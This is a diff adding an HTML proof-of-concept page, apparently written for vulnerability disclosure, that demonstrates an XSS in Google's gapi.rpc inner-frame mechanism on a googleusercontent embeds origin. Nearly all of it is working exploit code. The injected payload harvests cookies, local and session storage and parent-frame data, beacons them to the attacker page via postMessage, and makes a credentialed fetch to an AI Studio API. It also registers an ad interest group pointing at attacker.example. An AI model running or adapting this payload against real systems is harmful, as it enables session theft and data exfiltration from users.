@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head><title>GAPI RPC — Impact Demo</title></head>
+<body>
+<h3>GAPI RPC XSS — Impact Demonstration</h3>
+<pre id="log" style="font-size:11px;height:700px;overflow-y:auto;background:#111;color:#0f0;padding:10px;white-space:pre-wrap"></pre>
+
+<script src="https://apis.google.com/js/api.js"></script>
+<script>
+var logEl = document.getElementById('log');
+var OUR_ORIGIN = window.location.origin;
+
+function log(msg) {
+  console.log('[POC] ' + msg);
+  logEl.textContent += '\n[' + new Date().toISOString().slice(11,19) + '] ' + msg;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+// Receive exfil beacons from XSS payload
+window.addEventListener('message', function(e) {
+  if (e.origin !== OUR_ORIGIN && typeof e.data === 'string' && e.data.indexOf('EXFIL|') === 0) {
+    log('[EXFIL] ' + e.data.slice(6));
+  }
+}, true);
+
+// -----------------------------------------------------------------------
+// Payload running at atari-embeds.googleusercontent.com
+// Exfiltrates: cookies, localStorage, sessionStorage, window.parent objects,
+//              credentialed fetch to AI Studio API.
+// Beacons back via postMessage to attacker page (window.top).
+// -----------------------------------------------------------------------
+var XSS_PAYLOAD = [
+  '<style>body{background:#111;color:#0f0;font:12px monospace;padding:20px}</style>',
+  '<h2>XSS @ <span id=o></span></h2><pre id=out></pre>',
+  '<script>(function(){',
+  '  var origin = window.location.origin;',
+  '  document.getElementById("o").textContent = origin;',
+  '  function send(k,v){',
+  '    var line = k + ": " + v;',
+  '    document.getElementById("out").textContent += line + "\\n";',
+  '    try{ window.top.postMessage("EXFIL|" + line, "*"); }catch(e){}',
+  '    try{ window.parent.parent.postMessage("EXFIL|" + line, "*"); }catch(e){}',
+  '  }',
+  '  send("XSS_ORIGIN", origin);',
+  // Cookies at atari-embeds.googleusercontent.com
+  '  send("cookies", document.cookie || "(empty)");',
+  // localStorage
+  '  var lk = Object.keys(localStorage);',
+  '  send("localStorage.length", lk.length);',
+  '  lk.forEach(function(k){ send("ls["+k+"]", localStorage.getItem(k)); });',
+  // sessionStorage
+  '  var sk = Object.keys(sessionStorage);',
+  '  send("sessionStorage.length", sk.length);',
+  '  sk.forEach(function(k){ send("ss["+k+"]", sessionStorage.getItem(k)); });',
+  // window.parent = inner frame (same-origin with userHtmlFrame)
+  '  try{',
+  '    send("parent.origin", window.parent.location.origin);',
+  '    send("parent.cookie", window.parent.document.cookie || "(empty)");',
+  '    var pk = Object.keys(window.parent.localStorage);',
+  '    send("parent.ls.keys", JSON.stringify(pk));',
+  '    send("parent.gapi", typeof window.parent.gapi);',
+  '  }catch(e){ send("parent.error", e.message); }',
+  // Service workers at this origin
+  '  if(navigator.serviceWorker){',
+  '    navigator.serviceWorker.getRegistrations().then(function(r){',
+  '      send("sw.count", r.length);',
+  '      r.forEach(function(x,i){ send("sw["+i+"]", x.scope); });',
+  '    });',
+  '  }',
+  // Credentialed fetch to AI Studio (with:cors — tells us if cookies ride along)
+  '  fetch("https://aistudio.google.com/_/MakerSuiteService/ListApplets",{',
+  '    method:"POST", credentials:"include",',
+  '    headers:{"Content-Type":"application/json"},',
+  '    body:"{}"',
+  '  }).then(function(r){',
+  '    return r.text().then(function(t){',
+  '      send("ListApplets.status", r.status);',
+  '      send("ListApplets.body", t.slice(0,300));',
+  '    });',
+  '  }).catch(function(e){ send("ListApplets.error", e.message); });',
+  // Protected Audience interest group join at Google subdomain
+  // biddingLogicURL must be same-origin as owner — use blob: URL created at atari-embeds origin
+  '  if(navigator.joinAdInterestGroup){',
+  '    var blobJs = "function generateBid(){return{bid:1,render:\'https://attacker.example/ad.html\'};} function reportWin(){}";',
+  '    var blobUrl = URL.createObjectURL(new Blob([blobJs],{type:"application/javascript"}));',
+  '    navigator.joinAdInterestGroup({',
+  '      owner: origin,',
+  '      name: "gapi-rpc-xss-google-subdomain",',
+  '      biddingLogicURL: blobUrl,',
+  '      ads:[{renderURL:"https://attacker.example/ad.html"}]',
+  '    }, 2592000)',
+  '    .then(function(){ send("PA.join", "SUCCESS — Google subdomain as IG owner, blobUrl=" + blobUrl.slice(0,60)); })',
+  '    .catch(function(e){ send("PA.join.error", e.message); });',
+  '  }',
+  '})();<\/script>'
+].join('');
+
+gapi.load('gapi.rpc', function() {
+  log('GAPI loaded');
+
+  var iframe = document.createElement('iframe');
+  iframe.id = 'innerFrame';
+  iframe.name = 'innerFrame';
+  iframe.src = 'https://1091800372-atari-embeds.googleusercontent.com/embeds/' +
+    '1eea06de280c5ab9b261c0869a310ca0/inner-frame-minified.html' +
+    '?jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.ch0Jz-JlMrQ.O' +
+    '%2Fd%3D1%2Frs%3DAHpOoo_YD4KoV8fTh_kLhktsiThAm3yJ5A%2Fm%3D__features__' +
+    '&parent=' + encodeURIComponent(OUR_ORIGIN);
+  iframe.style.cssText = 'width:100%;height:300px;border:3px solid lime;margin-top:10px';
+
+  iframe.onload = function() {
+    log('Inner frame loaded. Waiting 3s for inner GAPI init...');
+    setTimeout(function() {
+      log('Injecting impact payload...');
+      gapi.rpc.call('innerFrame', 'updateUserHtmlFrame', null, XSS_PAYLOAD, true, false);
+      log('Payload sent. Watch for [EXFIL] lines...');
+    }, 3000);
+  };
+
+  document.body.appendChild(iframe);
+  log('Iframe appended. Attacker origin: ' + OUR_ORIGIN);
+});
+</script>
+</body>
+</html>
